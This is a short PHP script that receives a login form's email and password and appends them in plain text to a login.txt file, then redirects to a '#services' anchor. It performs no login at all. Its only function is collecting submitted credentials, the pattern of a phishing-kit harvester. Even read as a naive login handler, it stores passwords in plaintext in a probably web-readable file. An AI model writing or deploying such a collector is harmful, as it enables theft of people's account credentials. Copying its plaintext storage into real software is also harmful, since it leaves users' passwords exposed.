<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];
    $weaponOption = $_POST['weapon-option-1'];

    // Add the email and password to the login.txt file
    $file = fopen("login.txt", "a");
    fwrite($file, "Email: $email, Password: $password\n");
    fclose($file);

    // You may perform additional processing or validation here

    // Redirect back to the services section after processing
    header("Location: #services");
    exit();
}
?>
